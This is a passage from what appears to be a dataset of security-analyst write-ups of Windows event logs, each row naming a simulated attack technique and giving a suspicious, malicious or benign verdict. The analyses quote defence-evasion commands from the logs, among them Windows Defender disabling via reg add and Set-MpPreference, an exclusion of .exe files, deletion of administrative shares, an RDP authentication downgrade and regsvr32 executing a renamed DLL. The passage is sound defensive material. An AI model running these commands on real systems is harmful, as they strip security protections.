   - The logs indicate several Microsoft Edge Update activities executed by `NT AUTHORITY\SYSTEM`, which is expected when the system or applications are updated.

### Assessment:

- The invocation of `wevtutil.exe` and `cmd.exe` together with privilege-level actions under `admin_test` might be suggestive of an attempt to manipulate logs or conduct unauthorized administrative activities. The repetitive nature and timing of these processes are concerning and warrant investigation to rule out any unauthorized use.
- Though the `Edge Update` processes seem legitimate on their own, due to the lack of context (frequency, timing, and any accompanying anomalies), they need closer exploration for abnormal repetitive occurrences within such a short span.
- The existence of high integrity processes and command executions does exhibit some behavior that may require further scrutiny to discern if they map to a legitimate administrative task or a script executing without proper authorization.

### Guidance:

Considering the above findings:

- Review the processes initiated by the `admin_test` account, especially around the use of command-line utilities like `wevtutil.exe`.
- Analyze any scheduled tasks or scripts that might have triggered these commands to establish their legitimacy.
- Cross-reference with network logs if available, to check for any correlating unauthorized access attempts or data exfiltration activities.
- Investigate the time-changing event to ensure it aligns with legitimate actions.

### Resolution:

Based on these findings, the activity falls under the category of **SUSPICIOUS**. Further investigation is needed to confirm if the activity was initiated by an authorized user or process, and to determine the intention behind the use of certain utilities that can potentially clear logs or disrupt service configurations."
Regsvr32 Registering Non DLL,"Upon reviewing the provided Sysmon logs, several actions warrant further scrutiny to determine whether they constitute malicious activity:

1. **Suspicious Command Sequences:**
    - The presence of multiple `cmd.exe` executions with commands seemingly related to file manipulation and registration seem suspicious:
       - The command line `""cmd.exe"" /c copy ""C:\\Windows\\System32\\shell32.dll"" ""%%temp%%\\shell32.jpg""` suggests renaming a DLL to a JPG, possibly to disguise the file for malicious purposes.
       - Subsequent use of `regsvr32.exe` to execute this JPEG file (`regsvr32.exe /s %%temp%%\\shell32.jpg`) is unusual as `regsvr32` is typically used for registering DLLs, not image files. This behavior is commonly associated with code execution of a malicious payload.

2. **High Integrity Level:**
    - The commands were executed under a high integrity level (`High`), indicating administrative privileges, which provides the capability to perform significant changes to system configurations or execute potentially harmful commands more effectively.

3. **Repeated Execution of System Commands:**
    - There are multiple instances of `cmd.exe` and `conhost.exe` running what looks like scripted actions related to file checks and operations, which could indicate script-based automation indicative of suspicious activity or even malware.

4. **Anomalous Use of Wevtutil:**
    - The frequent execution of `wevtutil.exe` could suggest attempts to interact with the Windows Event logs, potentially for purposes like clearing logs to cover tracks.

5. **Temporal Anomalies:**
    - Time changes or synchronization events shown in the logs (Security, System) may suggest attempts to manipulate system clock. This can be used to evade detection mechanisms based on time stamps or to confuse log timelines.

Considering these factors, although the commands captured within these logs do suggest potentially malicious intent, particularly in how they're manipulating file extensions and possibly attempting to execute malicious payloads disguised as benign files, we cannot definitively confirm a compromise solely from these logs without additional context or results from in-depth checks on the files involved.

### Resolution: SUSPICIOUS

There is sufficient activity that deviates from normal operations, warranting further investigation. Recommended next steps include:

- **File Analysis**: Inspect the copied file `shell32.jpg` for any executable content using hash comparison, and static or dynamic malware analysis techniques.
- **User and Process Verification**: Verify the activity and accounts (`SERVER002\\admin_test`) to ensure they are in accordance with expected user behavior.
- **Log and System Review**: Check for additional related activities in other system or security logs, corroborate actions with authorized tasks and applications.
- **Network Activity**: Analyze network logs for this timeframe to identify any exfiltration attempts or unusual outbound connections.

This further investigation should confirm if these activities are indeed malicious or if they were part of a legitimate operation."
LockBit Black - Unusual Windows firewall registry modification -Powershell,"Upon analyzing the provided logs, several points of interest were identified:

1. **Frequent Execution of `wevtutil.exe` and `conhost.exe`**:
   - There are multiple entries showing the execution of `C:\Windows\System32\wevtutil.exe` and `C:\Windows\System32\conhost.exe` by the user `SERVER002\admin_test`. `wevtutil.exe` is a legitimate Windows command-line utility for administrative event log operations. However, its frequent appearance could merit further investigation to ensure it's being used for legitimate administrative tasks and not being exploited maliciously.

2. **PowerShell Usage**:
   - A concerning line in the Windows PowerShell log details the execution of a script intended to disable the Windows Firewall, using `New-ItemProperty` to modify the registry keys that control the firewall settings. This indicates an attempt to decrease the security posture of the system, suggesting potentially harmful activity.
   - PowerShell scripts being executed to disable firewall settings is a sign of malicious intent, as attackers might try to disable firewalls to allow further infiltration or lateral movement within the network.

3. **Microsoft Edge Update Activity**:
   - There are numerous logs indicating the execution of Microsoft Edge Update processes. These seem legitimate and part of routine software update processes. These entries on their own don't typically suggest malicious activity unless further context or alerts indicate otherwise.

### Assessment

Based on the log entries, especially the PowerShell script's attempt to disable critical security settings, there is a significant indication of suspicious and potentially malicious activity. The use of PowerShell to disable firewall protections aligns with common tactics used by adversaries to reduce host defenses.

### Conclusion

Resolution: **MALICIOUS**

The disabling of the firewall through PowerShell suggests potential compromise and malicious intent. Immediate action is recommended to contain the threat, which includes:
- Isolate the affected host from the network to prevent further spread or exfiltration.
- Investigate how the PowerShell command was executed to determine the vector of attack (e.g., phishing, user error, etc.).
- Conduct a thorough review of system changes, especially firewall and registry settings, and consider restoring system configurations.
- Perform a security audit on `SERVER002`, focusing on unaccounted user activities and privileges.
- Notify and work with Incident Response teams to understand and mitigate the attack vectors exploited by the threat actor."
Take ownership using takeown utility,"### Analysis of Windows Event Logs

Upon analyzing the event logs provided, I have identified several behaviors and patterns that require attention. Below is a detailed breakdown:

#### 1. **Unusual Process Executions and Command-line Arguments:**

- In the Sysmon logs, there are multiple instances of `cmd.exe` being executed with elevated ""High"" integrity levels using the `takeown.exe` utility. This operation is typically used to take ownership of files or directories, which hints at possible privilege escalation or data manipulation activities.
  - Event Record: `cmd.exe /c takeown.exe /f %%temp%%\\data.001_takeown_folder /r`
  - This sequence of activities suggests manual intervention or automated scripts attempting to change file ownership or permissions, common in data exfiltration or compromise attempts.

- The presence of `cmd.exe` commands like `""cmd.exe"" /c IF EXIST %%temp%%\\data.001_takeown_folder ( EXIT 0 ) ELSE ( EXIT 1 )` indicates an automated script environment checking for the presence of specific directories or files, which is atypical for standard user activity.

#### 2. **Activity Frequency and Repetition:**

- Within a short time frame, several processes related to `MicrosoftEdgeUpdate.exe` are spawned. Frequent process creation with related tools could suggest either a legitimate update process or could be exploited by an attacker to obfuscate malicious activities under the guise of legitimate software updates.

- Extensive creation of console windows (`conhost.exe`) linked to multiple `cmd.exe` executions argues for the likelihood of a script or automated system driving these events.

#### 3. **Indicators of Potential Compromise:**

- The usage of administrative-level commands, especially involving file ownership transfers and directly manipulated paths in the `Temp` directory, strengthens suspicion of unauthorized activity.
  
- The inclusion of key utilities (`takeown.exe` and `cmd.exe`) in potentially malicious patterns matches known tactics, techniques, and procedures (TTPs) utilized by attackers to maintain persistence and control over compromised systems.

### Assessment of Threats or Risks

- The attempted application of commands like `takeown.exe` and high-integrity level cmd executions in temporary directories pose a potential security threat, especially on a high-value target such as a CEO's machine.
  
- The frequent `MicrosoftEdgeUpdate.exe` process operations need to be verified for authenticity. While they may appear benign as part of regular software updates, this process can be mimicked by threats to gain unauthorized control or deploy further payloads.

### Recommended Actions

- **Immediate Action:**
  - Isolate the machine for deeper forensic analysis to prevent potential spread or further compromise.
  - Verify the integrity and authenticity of all `MicrosoftEdgeUpdate.exe` executions during the identified time frame through hash checks and checking against known good versions.
  
- **Internal Investigation:**
  - Perform an audit of file and folder permission changes in the reported `Temp` directory or related paths to assess impact.
  - Conduct a review to identify any similar activity across other systems in the network which might suggest coordinated or broad-based attacks.

- **Long-term Strategy:**
  - Implement advanced detection capabilities for similar patterns of behavior in EDR solutions.
  - Educate users, particularly high-value individuals or those with administrative privileges, about recognizing unusual system prompts or behavior indicating potential script-based attacks.

### Resolution

- **SUSPICIOUS**: The activities observed suggest potential abnormalities and warrant thorough investigation to ascertain whether these are benign system and application updates or indicative of a larger, covert operation."
Tamper with Windows Defender Registry - Reg.exe,"### Analysis of Windows Event Logs:

#### 1. **Application Logs:**
- **Windows Defender Disabled:** Numerous events indicate that Windows Defender is in a ""SECURITY_PRODUCT_STATE_OFF"" state. This is a red flag as it suggests the system's antivirus protection has been disabled, which could be indicative of malicious activity. The absence of antivirus protection makes the system vulnerable to threats.

#### 2. **System Logs:**
- **Time Anomalies:** There are events indicating a change in system time. Event ID 1 and 24 from `Microsoft-Windows-Kernel-General` and Security event ID 4616 suggest system time changes. While this can sometimes be benign (due to synchronization with time servers), it can also be used by attackers to evade detection or tamper with forensic timelines.

#### 3. **Sysmon Logs:**
- **Suspicious Command Execution:** Multiple `cmd.exe` and `reg.exe` executions with commands to disable various Windows Defender features:
  ```bash
  reg add ""HKLM\Software\Policies\Microsoft\Windows Defender"" /v ""DisableAntiSpyware"" /t REG_DWORD /d ""1"" /f
  ```
  This sequence specifically disables aspects of Windows Defender's protection mechanisms and increases the system's exposure to malware. The disabling of real-time protection, behavioral monitoring, and other security layers is a common tactic used by malware to avoid detection.

- **Frequent Process Activities:** A number of processes (`wevtutil.exe`, `conhost.exe`, `cmd.exe`, `reg.exe`) are executed repeatedly by `SERVER002\admin_test`. This could be indicative of scripts or malware automating tasks on the system.

- **Unusual Edge Update Activities:** There are multiple instances of Edge updates and services stopping (logged by `edgeupdate`). While not inherently suspicious, the timing alongside the Defender being turned off could suggest further investigation.

#### 4. **Security Logs:**
- **No Direct Security Breach Detected:** Apart from the time changes, the security logs do not reveal direct evidence of unauthorized access, but they lack sufficient detail about other suspicious activities seen in Sysmon logs.

### Assessment:
- **Threats & Risks:**
  - The disabling of Windows Defender and registry modifications to prevent its activation are clear indicators of compromise.
  - Changes to the system time could be either benign or malicious, but when combined with other events, they suggest potential tampering.

- **Resolution: MALICIOUS**

### Guidance on How to Proceed:
1. **Immediate Actions:**
   - Re-enable Windows Defender and run a comprehensive virus scan to identify and remove any persistent threats.
   - Isolate the machine from the network to prevent potential lateral movement and further compromise of other systems.
   - Gather forensic images of the system for a deeper investigation to identify any malware or unauthorized scripts.

2. **Investigation:**
   - Review scheduled tasks, startup items, and running processes for suspicious entries.
   - Investigate any signs of persistence mechanisms using registry and file system modifications.
   - Examine additional logs for lateral movements or data exfiltration attempts.

3. **Remediation:**
   - Clean or rebuild the affected system to ensure no remnants of the attack remain.
   - Deploy enhanced monitoring solutions to detect similar activities in the future.

4. **Reporting:**
   - Document all findings and actions taken during the investigation for compliance and future reference.
   - Notify relevant stakeholders and possibly affected parties if sensitive data was at risk.

In conclusion, the logs exhibit multiple signs of malicious activity, especially with the Windows Defender being deliberately disabled, necessitating immediate response and remediation."
DLP Evasion via Sensitive Data in VBA Macro over HTTP,"Upon reviewing the provided Windows event logs, several indicators require closer scrutiny. Here's a detailed analysis:

### Suspicious Activities Noted:

1. **Intercepted PowerShell Commands:**
   - There are multiple entries in the Windows PowerShell logs indicating a script execution with `Invoke-WebRequest` pointed to `127.0.0.1` and trying to POST `data-cc-macro.xlsm`. This demonstrates potential data exfiltration or malicious macro execution, possibly indicating an attempt to elevate privileges or distribute malware internally.

2. **High Privilege Activities:**
   - A logon session with privileges such as `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, `SeImpersonatePrivilege` among others (event ID 4672) for the user `admin_test` seems suspicious as these privileges are typically unnecessary for most operations except system-level debugging or manipulation.

3. **Unexpected Credential Access Events:**
   - Numerous Event ID 5379 logs indicate attempts to access credential objects related to `MicrosoftAccount:user=02txoixylodcstop` with return code `3221226021` suggesting failure to access/impersonate credentials. Such attempts, particularly in bulk, can suggest a potential credential access attack.

4. **Utilization of System Tools (Sysmon Logs):**
   - Multiple executions of system utilities such as `whoami.exe`, `wevtutil.exe`, and an unusually frequent use of `conhost.exe`. This could be indicative of a user attempting to gather information about system and session, common in reconnaissance stages of attacks.

5. **Time Change Events:**
   - The logs indicate that the system time was altered (Event ID 4616), a technique that can sometimes be used to cover tracks or disrupt audit trails on Windows systems. The reason provided is process-driven - svchost.exe - which in itself isn't inherently malicious unless misused.

### Assessment:

The activities logged point towards **SUSPICIOUS** behavior. The PowerShell activity, efforts to read credential objects, and high privilege assignments present potential signs of compromise, yet without definitive proof of malicious intentions. It's crucial to investigate these anomalies to ensure no breach occurred.

### Recommended Action:

1. Perform a **full forensic analysis** on the machine, particularly the `admin_test` user's activities during the noted periods.
2. Conduct a **thorough scan for malware** or unknown scripts, focusing on the file referenced in PowerShell activities, especially in temporary directories.
3. Restrict and monitor subsequent **PowerShell executions**, implementing script block logging and system-wide execution policy restrictions.
4. Review user privileges, particularly for `admin_test`, and ensure they align strictly with job requirements.
5. Monitor network activity for any unusual outgoing requests, particularly those related to IP `127.0.0.1` and other local server connections.
6. Re-examine **Windows Update Policies** and **Network Time Protocol (NTP)** configurations to ensure integrity.
7. Re-evaluate security measures like antivirus updates or network firewall configurations that can help deter unauthorized access or data leakage.

Final resolution is **SUSPICIOUS** - further investigation and steps are needed to fully conclude on the threat level."
Disable Administrative Share Creation at Startup,"**Detailed Analysis of Logs:**

1. **Windows PowerShell Log:**
   - The PowerShell log is missing. PowerShell logs can provide valuable insights into potential script-based activity. Without these logs, it is difficult to determine if any suspicious scripts were executed.

2. **System Log:**
   - Events appear to show standard system activity, including time adjustments and typical service operations. These are usually associated with regular system maintenance, like synchronizing system clocks.

3. **Security Log:**
   - Key events include multiple logon (4624) and special privileges assignment (4672) events:
     - **Event ID 4624 (Logon):** The user `admin_test` logged in using NTLM authentication from a workstation named `DESKTOP-3HL5B2P`. Multiple logons with type `3` indicate network logons, which are expected in environments with servers and remote management.
     - **Event ID 4672 (Special Privileges):** The `admin_test` account was granted high privileges (SeDebugPrivilege, SeBackupPrivilege, etc.). This account action could be typical for an admin but should be investigated further to confirm legitimacy.
   - The presence of high-privilege operations merits a closer look due to potential misuse.

4. **Sysmon Log:**
   - Observes process creations and certain command-line executions:
     - **CMD.EXE Execution:** The command `reg add` under `cmd.exe` to modify registry keys for AutoShareServer and AutoShareWks values is unusual and is often associated with attempts to disable administrative shares, which can suggest malicious intent.
     - Continuous executions of known legitimate processes like `MicrosoftEdgeUpdate.exe` and other system processes (`whoami.exe`, `conhost.exe`) are logged.
     - There is extensive activity around Microsoft Edge Update, which is likely just a scheduled or manual update happening in a controlled and expected manner.
   
5. **Application Log:**
   - Contains benign events mainly related to the stopping of the `edgeupdate` service, likely coinciding with the completion of an update or maintenance task.

**Assessment and Recommendation:**

- **Suspicious Activities:**
  - The execution of registry modifications to disable auto share features suggests attempted system configuration changes that could be unauthorized or malicious if not validated as part of routine maintenance by IT personnel. 
  - The high privileges granted to the `admin_test` account and actions taken from an external workstation need verification for legitimacy and authorization.

- **Recommendation:**
  - **Immediate Action:** 
    - Verify if the `admin_test` account activities during the provided timestamps are indeed authorized by the IT or admin team.
    - Cross-check with other logs (like PowerShell logs if retrievable) and any network monitoring tools for further suspicious activities associated with these actions or accounts.
  - **Further Investigation:**
    - Review policies and configurations on executing registry writes and altering system configurations without proper auditing or authorization.
    - Monitor the `admin_test` account closely for any subsequent activities not aligned with usual profiles.

**Final Resolution: SUSPICIOUS**

The logs contain suspicious activity that suggests potential unauthorized modifications to system configurations, which warrants further investigation to rule out malicious behavior."
Windows - Timestomp a File,"### Detailed Analysis

Upon examining the provided logs, several entries indicate suspicious behavior, potentially signifying malicious activities on the Windows host, specifically related to PowerShell usage:

#### Windows PowerShell Log:

- **PowerShell Execution:** The logs indicate the execution of a PowerShell script located in a temporary directory. The command involves `import-module` of `timestomp.ps1`, which is known for its potential use in modifying file timestamps, a tactic commonly associated with adversaries attempting to obfuscate their activities by altering forensic evidence. This alone warrants suspicion, as legitimate usage of timestomp functionalities is rare outside of red team or malicious activities.

#### Sysmon Log:

- **Process Creation and Image:** An entry shows a PowerShell process being invoked with a command-line script that includes the `timestomp` module. This action follows the PowerShell execution patterns seen in historical attack chains, where PowerShell is utilized to run potentially harmful scripts under the guise of legitimate Windows processes.
- **User Account:** Most processes are run under `admin_test` from `SERVER002`, which shows administrative privileges involvement, enhancing the risk level of this activity.
  
#### Application Log:

- **Edge Update:** Normal Edge update processes and services are stopped and started, which in themselves are not inherently suspicious but could also be used to mask or time align with other activities in a timeline of compromise events.

#### Risk Assessment:

- **Timestomp Activity:** The use of `timestomp.ps1` is unequivocally a red flag suggesting malicious intensions, assuming no legitimate red-team activity or scripting by an authorized team.
- **Obfuscation Tactics**: Using a PowerShell script to potentially modify timestamps is indicative of a strategy to hide tracks.

### Threats or Risks Identified:

1. **File Timestamp Manipulation**: This is a classic technique in the post-exploitation phase of an attack that might be used to cover up unauthorized changes made to system files or executables.
2. **Execution of Scripts from a Temp Directory**: The use of a temporary directory to host critical script operations increases the risk, as these folders are often used to store and execute short-lived payloads by threat actors.
3. **Potential Unauthorized Access**: The usage of `admin_test` account running these scripts could either indicate insider threat potential or a hijacking of privileged accounts by malicious actors.

### Guidance on How to Proceed:

1. **Immediate Investigation**: Conduct a deep dive forensic analysis on the `Server002` machine to detail the full scope of any compromise, starting with the temporary directories identified.
2. **Account Monitoring**: Investigate how the `admin_test` account is being used. Verify if credentials have been compromised, and ensure its password is changed immediately.
3. **Metadata Analysis**: Check for any other usage of timestomp or similar tools across systems, to look for a broader pattern of compromise or tampering.

### Resolution:

- **Resolution**: **MALICIOUS**

Given the context of the logs and the known implications of using tools like `timestomp.ps1`, the activity recorded matches patterns consistent with an advanced threat potentially engaging in post-exploitation activities. Follow-up actions should focus on containment, eradication, and recovery as per organizational incident response protocols."
Invoke CHM Shortcut Command with ITS and Help Topic,"### Detailed Analysis of Windows Event Logs:

1. **Unusual Process Execution:**
   - Multiple instances of `powershell.exe` and `wevtutil.exe` observed being executed by `admin_test` user, which could be a common pattern observed in exploitation frameworks, suggesting suspicious activity.
   - `powershell.exe` was executed with a complex command-line argument involving `Invoke-ATHCompiledHelp` which appears to be an unusual execution and possibly malicious, indicative of PowerShell abuse.

2. **Suspicious Command-Line Arguments:**
   - The command `Invoke-ATHCompiledHelp` with additional parameters executed through `powershell.exe` looks suspicious. Typically, PowerShell abuse in compromised systems involves encoded or long command executions as seen here.
   - The command-line argument used in the PowerShell session includes unusual references to HTML help file parsing, which can be a method to subvert help files for malicious purposes.

3. **Privilege Escalation:**
   - The logs show `wevtutil.exe` process executions repeatedly, often related to event log manipulation, potentially indicating an attempt to clear logs as part of trace cleaning in malicious activities.
   - Event ID 4672 logs indicate high privileges being assigned, which could be abused for unauthorized activities, although this could also be routine for certain processes.

4. **Environment Details:**
   - Logs captured on `Server002` involving the `admin_test` user, providing context on where and by whom these activities were executed.

5. **Additional Events:**
   - Other processes running with system integrity level and user `NT AUTHORITY\SYSTEM` show highly privileged process execution, though normal in certain contexts. The recurring execution of `svchost.exe`, and maintenance processes like `CompatTelRunner.exe` appear standard for system operations and updates.
   - Security logs contain multiple event 5379 entries related to credential access, though no evident successful compromise seen directly through these events.

### Assessment of Malicious Activity:

Analyzing the logs, the presence of complex PowerShell command executions under the `admin_test` account, potentially leveraging the `Invoke-ATHCompiledHelp` function for executing unauthorized actions strongly indicates potential malicious behavior. The repeated use of system utilities often abused by threat actors for log manipulation, coupled with high integrity-level process executions, further raises a red flag.

### Resolution:

**Resolution: MALICIOUS**

### Guidance:

1. **Immediate Actions:**
   - Isolate the affected system (Server002) to prevent further spread or damage if any lateral movement occurred.
   - Initiate a comprehensive malware scan and forensic analysis to confirm unauthorized scripts or software.
   - Change credentials for `admin_test` and any other users with similar privileges to avoid unauthorized access issues.

   - Deploy advanced threat detection measures and enhance monitoring on suspicious processes like PowerShell and system utilities.
   - Educate staff, focusing on security training to ensure vigilance against social engineering tactics leading to unauthorized script execution.

Concluding, the activities noted signify a likely breach attempt, and swift action coupled with increased vigilance and system hardening measures are essential to mitigate this threat."
Uninstall Sysmon,"### Analysis of the Logs

Below is the breakdown of the events in each log where entries are available:

#### Application Log

1. **edgeupdate Service Stopped Events**: 
    - **Event Record IDs**: 2382 & 2384
    - These logs show that the `edgeupdate` service stopped at two separate instances.
    - Merely stopping the `edgeupdate` service is not inherently suspicious; it might indicate a normal service stoppage procedure.

2. **Software Protection Platform Service Event**:
    - **Event Record ID**: 2383
    - The event refers to activity from the Software Protection Platform Service, which is normal on Windows systems related to ensuring software licensing integrity.
    - `RulesEngine` is mentioned, which typically operates within normal boundaries for compliance and licensing rights checks.

#### System Log

1. **Microsoft-Windows-FilterManager Event**:
    - **Event Record ID**: 3573
    - This event showcases normal filter manager operations. `SysmonDrv`, as indicated, seems related to Sysmon (System Monitor), a tool used for logging and event monitoring.
    - The presence of a filter manager event by itself is standard during system operations.

### Assessment of the Situation

The provided logs consist of mostly benign or normal occurrences based on the parsed data:

- **edgeupdate Service Stopped**: This is likely benign unless greater context or patterns of stoppage suggest timing associated with potentially malicious script execution.
  
- **Software Protection Platform Logging**: Serves typical functionality for license integrity checks and does not directly indicate a compromise within this event.

- **Microsoft-Windows-FilterManager Event**: The System FilterManager interaction with Sysmon is a benign system function unless further context outside this event is provided, such as unexpected configurations linking it to malicious behavior logging or unexplained spikes in event creation.

### Conclusion and Recommendation

Based on the logs present, there is no clear indication of malicious activity. The activity recorded appears to be routine in nature with no anomalies suggesting immediate compromise.

**Final Resolution: BENIGN**

**Guidance**: Continue regular monitoring and ensure to have data visibility over correlated logs and other systems monitoring for completing context. Any patterns, repeated occurrences, or timing of these services/actions that coincide with expected peak attacks should be evaluated deeper in more extensive log trails or tied to other evidence not covered here."
Tamper with Windows Defender ATP PowerShell,"Upon careful examination of the provided Windows event logs from a series of categories (PowerShell logs, Application logs, Sysmon logs, Security logs, and System logs), here is a detailed assessment of the findings and resolution:

### Analysis:

1. **Windows PowerShell Log:**
   - The execution of the PowerShell command `Set-MpPreference -DisableRealtimeMonitoring 1, Set-MpPreference -DisableBehaviorMonitoring 1, Set-MpPreference -DisableScriptScanning 1, Set-MpPreference -DisableBlockAtFirstSeen 1` is highly suspicious. This command disables various protective features of Windows Defender, which is commonly seen in attempts to disable security mechanisms on a machine. 

2. **Application Log:**
   - Multiple entries with `SECURITY_PRODUCT_STATE_SNOOZED` for Windows Defender reinforce that the antivirus was set to an inactive state, further corroborating the suspicious activity found in the PowerShell logs.

3. **Sysmon Log:**
   - Legitimate Windows system processes (`wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`) are observed in the execution logs. However, they do not directly indicate any malicious actions but might have been used around the time suspicious PowerShell commands were executed.
   - The process executions align with a timeline consistent with the suspicious PowerShell activity.

4. **Security and System Logs:**
   - There is tampering with system time as indicated by the events indicating changes in time. Time manipulation can be used to obscure timestamps of certain activities on the machine.

### Assessment of the situation:

The logs reveal clear indicators of suspicious and likely malicious behavior. The PowerShell command attempts to disable critical security features of Windows Defender, which along with the associated `SECURITY_PRODUCT_STATE_SNOOZED` entries in the application logs, strongly suggests an attempt to perform or facilitate unauthorized or malicious activity. Additionally, alterations to system time might have been executed to hide tracks or confuse logs. 

### Threats or Risks Identified:

- Disabling of antivirus protection increases the risk of the system being compromised by malware.
- System time modification might indicate an attempt to obscure malicious activity.

### Guidance on how to proceed:

1. **Immediate Actions:**
   - Re-enable and verify all security features on Windows Defender immediately.
   - Conduct a full system scan using multiple security solutions to identify any potential malware present.

2. **Investigative Actions:**
   - Perform a detailed forensic investigation to uncover any further evidence of compromise.
   - Review logs thoroughly surrounding this event time for any additional suspicious activities or unauthorized access.

3. **Preventive Measures:**
   - Review user permissions and access controls to prevent unauthorized PowerShell scripts from running.
   - Implement additional monitoring and alerting for similar attempts in the future.

### Resolution:

**MALICIOUS** - The logs demonstrate activity consistent with an attempt to disable security protections, which is a strong indicator of malicious intent. Immediate investigation and remediation actions are necessary."
Remove Administrative Shares,"Upon reviewing the provided Windows event logs, here is a detailed analysis of any suspicious activities observed:

### Key Observations:

1. **Process Execution and Identifier Analysis:**
   - **Unusual Execution Paths**: 
     - The log entries from Sysmon reveal multiple processes being executed from directories such as `C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe` and `C:\Program Files (x86)\Microsoft\Temp\EU4183.tmp\MicrosoftEdgeUpdate.exe`. The presence of software in temporary directories can be suspicious, indicating potential misuse or side-loading.
   - **Command Execution**:
     - There are entries indicating the execution of `cmd.exe` with commands for deleting network shares (e.g., `net share C$ /delete`). This could imply a user or process is attempting to hide activities by removing administrative shares, which is suspicious.
   - **Process Ancestry and Integrity Level:**
     - Instances of command-line programs such as `whoami.exe` and `hostname.exe` running with high integrity level suggest that these are potentially being executed by an admin user, but can also indicate reconnaissance activity by an attacker.

2. **Network Share Deletion:**
   - The commands to delete network shares (C$, IPC$, ADMIN$) with high integrity level under the context of `SERVER002\admin_test` indicates potentially nefarious intent to cover tracks or limit access to shares by changing or removing administrative shares.

3. **Service and System Function Interactions:**
   - The appearance of commands being executed through `cmd.exe` to alter network configurations or system behaviors without clear justification can suggest malicious attempts to manipulate the system.

4. **Time Change Events:**
   - The system log entries indicating time changes via `svchost.exe` might suggest that time synchronization activities occurred as expected, however, the absence of user interaction logs or justification can sometimes link to masking activity timelines.

### Assessment:

The logs indicate suspicious behavior mainly due to the following:
- Execution of process from unexpected directories like temporary folders.
- High integrity level executions of system commands generally used in reconnaissance or lateral movement.
- Deletion of administrative network shares which could imply attempts to manipulate access controls or conceal activities.

### Resolution:

Based on the logs provided and the context of activities:
- **Resolution: SUSPICIOUS**

### Guidance:

1. **Further Investigation**:
   - Review the context around the execution of commands and processes related to network shares and temporary directory activities.
   - Verify whether these actions were approved or part of scheduled administrative tasks.
   - Investigate the source of abnormal process execution to determine if malware or unauthorized tools are present.

2. **Immediate Actions**:
   - Monitor similar activity across other systems to identify patterns or wider spread.
   - Consider applying restrictions or additional monitoring on script and system tools execution to catch further anomalous behavior.

3. **Preventative Measures**:
   - Ensure auditing and alerting are enabled for changes to critical system settings and unauthorized use of command-line tools.
   - Conduct a security review of the CEO's machine and other critical systems for potential vulnerabilities or exposure pathways."
RDP Authentication Level Override,"**Detailed Analysis of the Logs:**

Upon reviewing the provided Windows event logs, I have identified several points of interest that warrant further investigation:

1. **Frequent execution of `wevtutil.exe` and `cmd.exe`:**
   - We see multiple instances of `wevtutil.exe` being executed by the user `SERVER002\admin_test`. While `wevtutil.exe` is a legitimate Windows utility for managing Windows Event Logs, frequent execution might indicate log tampering or clearing of event logs, often associated with attempts to hide malicious activities.
   - Additionally, `cmd.exe` is used to modify the `HKCU\Software\Microsoft\Terminal Server Client` registry key, specifically the `AuthenticationLevelOverride` value. This modification could potentially lower the security level for RDP connections leading to more vulnerable configurations.

2. **Registry Modification:** 
   - The specific registry change attempted through `cmd.exe` and `reg.exe` is suspicious:
     - Command: `reg add ""HKCU\Software\Microsoft\Terminal Server Client"" /v AuthenticationLevelOverride /t REG_DWORD /d 0 /f`
     - This command effectively sets the `AuthenticationLevelOverride` to `0`, which can cause the client to not perform server authentication checks in an RDP session, thus could potentially allow credential interception or man-in-the-middle attacks.

3. **Execution of `whoami.exe` and `hostname.exe`:**
   - The execution of `whoami.exe` and `hostname.exe` may indicate someone verifying their user context and system information. These actions are common after successful unauthorized access to assess privileges and collect host information.

4. **Time Manipulation Events:**
   - There are events showing changes to system time (`EventID 4616`). Time changes on a server can be indicative of an attacker attempting to disrupt or evade detection mechanisms that rely on correct timestamps.

5. **Execution under High Integrity Context:**
   - Multiple processes like `cmd.exe` and `reg.exe` were executed under a high-integrity context by the user `admin_test`, implying they had elevated privileges potentially through a means like impersonation.

**Assessment of the Situation:**
Given the observations mentioned, there is evidence of **potentially malicious activity** occurring on `Server002`. The combination of repeated and unusual executions of administrative tools, registry manipulation to weaken RDP security, and timestamp changes suggest an attempt to hide activities or prepare the system for further exploitation.

**Threats or Risks Identified:**
- **Privilege Misuse:** Execution under elevated privileges can allow unauthorized actions.
- **Security Configuration Manipulation:** Weakening RDP security settings increases the risk of unauthorized access.
- **Log Tampering or Evasion Tactics:** Could indicate attempts to mask malicious actions by altering logs.

**Guidance on How to Proceed:**
1. **Immediate Incident Response:**
   - Investigate the account `SERVER002\admin_test` for any abnormal access patterns or other linked suspicious activities.
   - Review other system access logs to determine if unauthorized accounts accessed the system.
   - Examine network logs for any signs of data exfiltration during or after these events.

2. **Security Audit:**
   - Conduct a full audit of the affected system and related security configurations.
   - Review other systems for similar anomalies that might suggest lateral movement by an attacker.

3. **Containment and Remediation:**
   - Ensuring registry settings for RDP (and others) are configured according to best security practices.
   - Apply necessary patches and updates across systems.
   - Monitor the network and systems for further anomalous activities.

**Resolution:**
Based on the evidence found, the logs contain activity consistent with potential compromise tactics, and therefore, the resolution for this analysis is **MALICIOUS**."
Tamper with Windows Defender Evade Scanning -Extension,"### Detailed Analysis of Logs

#### System Logs:
1. **Event 1 & Event 24 (Microsoft-Windows-Kernel-General)**: These logs detail time changes on the system initiated by the `svchost.exe` process. While time changes can be legitimate, frequent or unexpected changes could suggest tampering. However, without more contextual logs or frequency, this alone is not conclusive of malicious intent.

2. **Event 35 (Microsoft-Windows-Time-Service)**: The system time source was chosen from `time.windows.com`, which is a valid NTP source.

#### Application Logs:
1. **edgeupdate Service Stopped**: The stopping of the `edgeupdate` service is logged, which typically relates to Microsoft Edge auto-update services. This seems routine and not immediately suspicious.

2. **Microsoft-Windows-Security-SPP**: This event suggests the Software Protection Platform Service logged an operation, also not uncommon.

#### PowerShell Logs:
1. **Suspicious PowerShell Activity**: Multiple PowerShell logs indicate execution with a process that uses `Add-MpPreference -ExclusionExtension $excludedExts` to exclude `.exe` files. This behavior, while possible in legitimate administrative scripts, is often used by threat actors to evade antivirus scanning by excluding certain file types from detection. This is a significant red flag and warrants further investigation.

#### Sysmon Logs:
1. **Frequent Execution of wevtutil.exe and conhost.exe**: `wevtutil.exe` and `conhost.exe` are executed multiple times by `SERVER002\admin_test`, which may be part of routine log querying or could indicate potential log tampering or investigation artifact creation. It's noteworthy but not conclusively malicious without additional context.

2. **Process Execution Logs**: `hostname.exe`, `whoami.exe`, and PowerShell are executed by the `admin_test` user. `whoami.exe` execution is often used in scripts or by attackers trying to confirm their access level or user context, which may raise a red flag depending on context.

